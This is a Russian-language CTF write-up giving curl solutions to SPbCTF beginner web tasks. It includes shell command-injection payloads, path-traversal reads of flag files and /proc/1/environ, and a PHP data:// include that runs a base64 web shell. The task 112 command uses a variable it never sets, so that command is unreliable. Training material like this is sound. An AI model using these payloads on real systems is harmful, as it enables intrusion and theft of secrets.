# SPBCTF webkids

https://web-kids20.forkbomb.ru/tasks

Читаем man curl , чтобы понять как работают решения простых тасков. Для поиска по ману `/` и параметр.

## таск 1

```bash
curl http://kslweb1.spb.ctf.su/first/level1
```

## таск 2

```bash
curl -L -k http://kslweb1.spb.ctf.su/first/level2
```

## таск 3

```bash
curl -L -k http://kslweb1.spb.ctf.su/first/level3
```

## таск 4

```bash
curl -X POST -d "want_flag=YES" -d "code=1337" http://kslweb1.spb.ctf.su/first/level4/
```

## таск 5

```bash
curl -X POST -d "fun=Kaspersky%20%26%20Summer%20%26%20Lab" "http://kslweb1.spb.ctf.su/first/level5/"
```

## таск 6

```bash
curl -H "SPbCTF: Pretty cool" "http://kslweb1.spb.ctf.su/first/level6/"
```

## таск 7

```bash
# ибо echo a{1..100}; будет a1;a1;a3;...
curl -v -H "Cookie: $(printf 'a%03d=1;' {1..100})" "http://kslweb1.spb.ctf.su/first/level7/"
```

## таск 8 
```bash
curl -i http://kslweb1.spb.ctf.su/first/level8/ 
``` 

## таск 9
```bash
curl -H "Cookie: do_i_really_want_flag_for_level_nine=yes" "http://kslweb1.spb.ctf.su/first/level9/"
```

## таск 10

```bash
curl http://kslweb1.spb.ctf.su/first/level10/robots.txt
```
```bash
curl http://kslweb1.spb.ctf.su/first/level10/hidden_admin_panel_WOW.php
```

## таск 11 

```bash
dirsearch -u http://kslweb1.spb.ctf.su/first/level11/
```
```bash
curl -k -L http://kslweb1.spb.ctf.su/first/level11/management
```

## таск 12

```bash
curl -v http://kslweb1.spb.ctf.su/first/level12/
```
читаем код js:
```js
function tryPassword() {
  var flag = document.getElementById('ctfflag').value;

  if (flag.length != 32) { alert("WRONG because of # 1"); return; }
  if (flag.substr(0, 16) != "4fd1a3d79a407b66") {alert("WRONG because of # 2");return;}
  if (flag.substr(19, 3) != "cbf") { alert("WRONG because of # 3");return;}
  if (flag.substr(16, 3) != "d37") { alert("WRONG because of # 4"); return; }
  if (flag.substr(22, 6) != "61a7ab") { alert("WRONG because of # 5");return;}
  if (flag.substr(28, 2) != flag.substr(0, 2)) { alert("WRONG because of # 6");return;}
  if (flag.substr(30, 2) != 0x0E) { alert("WRONG because of # 7"); return;}
  alert("YES, exactly!");
}
```
В 6 проверке сравнивается с подстрокой из первых двух символов это 4f, 0x0E это 14. 
Флаг KSL{4fd1a3d79a407b66d37cbf61a7ab4f14}

## таск 13 
> Where else the flag can be placed by JS?

Через DevTools открываем Storage -> LocalStorage 

## таск 14

```bash
curl http://kslweb1.spb.ctf.su/first//level14/index.php?give_flag=1 -o im.png
```

## таск 29 sh

Пользовательский ввод напрямую вставляется в команду баша, затем вывод из stdout, нужно отрезать лишнее и обойти ошибки.

Полезная нагрузка `1.1; cat flag`

```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/ping' --data-raw 'address=1.1%3B+cat+flag' | jq
```

## таск 30 sh

Полезная нагрузка
```
/|cat flag
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/ls' --data-raw 'dir=/|cat+flag' | jq
```

## таск 31 sh

Полезная нагрузка
```
1&&cat /flag
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/ps' --data-raw 'pid=1%26%26cat+%2Fflag' | jq
```

## таск 32 sh

Полезная нагрузка
```bash
`cat flag`
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/echo1' --data-raw 'what=%60cat+flag%60' | jq
```

## таск 33 sh

Полезная нагрузка
```bash
$(cat flag)
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/echo2' --data-raw 'what=%24(cat+flag)' | jq
```

## таск 34 sh

Полезная нагрузка
```bash
cat flag # idk
```
```bash
curl 'https://2019-10-13-cmdinj.ctf.su/task/grep' --data-raw 'shell=cat+flag+%23' | jq
```

## таск 106 LFI

```bash
curl -s https://2019-11-10-favn.ctf.su/
```
в html видим это
```html
<link rel="icon" href="/static/?file=favicon.ico">
```
следовательно может можем и другие файлы
```bash
curl "https://2019-11-10-favn.ctf.su/static/?file=../flag"
```

## таск 107 LFI

```bash
curl -s "https://2019-11-10-waf.ctf.su/"
```
в html видим это
```html
<div class="text-center">
    <img src="/static?file=rori.png" class="img-fluid rounded" height="30%">
</div>
```
в исходнике видим это 
```go
http.HandleFunc("/static/", staticHandler)
// ... ->
func staticHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	filepath := r.Form.Get("file")
	filepath = fmt.Sprintf("static/%v", filepath)
    // ...
	if strings.Contains(filepath, "..") {
		filepath = strings.ReplaceAll(filepath, "..", ".")
	}

	file, _ := ioutil.ReadFile(filepath)
	w.Write(file)
}
```
```bash
# ибо strings.ReplaceAll находит отдельно .. и приводит .... к ..
curl "https://2019-11-10-waf.ctf.su/static/?file=..../flag"
```

## таск 108 LFI

в исходнике [здесь](https://github.com/Sinketsu/kids-css-minify/blob/master/src/Minifier.php) видим сначала это 
```php
$importContent = file_get_contents($path);
```
и проверку расширения 
```php
protected function isImage($path)
{
    foreach ($this->imageExtensions as $ext) {
        if (stripos($path, $ext) > 0) {
            return true;
        }
    }
    return false;
}
```
```bash
curl 'https://2019-11-10-css.ctf.su/compress.php' --data-raw 'css=body%7Bbackground%3Aurl(%22%2Fa.jpg%2F..%2F..%2F..%2F..%2Fflag%22)%7D' 
```

## Таск 109 LFI

в исходнике видим это 
```go
func staticHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()

	filepath := r.Form.Get("file")
	filepath = fmt.Sprintf("static/%v", filepath)
    // ...
	file, err := ioutil.ReadFile(filepath)
    // ...
	w.Write(file)
}
```

```bash
curl "https://2019-11-10-docker1.ctf.su/static/?file=../../../idk/path/to/flag"
```

## Таск 110 LFI

```go
flag, _ := os.LookupEnv("FLAG")
flag = flag
```

```bash
curl "https://2019-11-10-docker2.ctf.su/static/?file=../../..//proc/1/environ" -o f.txt
```

## Таск 111 LFI

в исходнике видим это 
```go
flagFile, err := os.Open("/PATCHED")
if err != nil {
    log.Println(err)
}
flagFile = flagFile
```

```bash
curl "https://2019-11-10-docker3.ctf.su/static/?file=../main.go"
```
```bash
curl "https://2019-11-10-docker3.ctf.su/static/?file=../../..//flag_directory/idk/flag"
```

## Таск 112 LFI RCE

в исходном коде и подсказка параметра:
```php
</body>
</html><?php
    $file = $_GET['include'];

    include $file;
?><?php
    echo "Get flag from <a href=\"/get.php?include=flag.php\">/get.php?include=flag.php</a><br><br>";
    echo "O, i turn `allow_url_include` On :)";
?>
```
название файла изменили, `include $file;` может исполнять php код
```bash
p1=$(echo -n '<?php system($_GET["cmd"]);?>' | base64)
curl "https://2019-11-10-rce.ctf.su/get.php?include=data://text/plain;base64,$payload&cmd=cat+*"
```

## Таск 113 LFI
```bash
curl "https://2019-11-10-local.ctf.su/get.php?get=http://127.0.0.1:/"
```
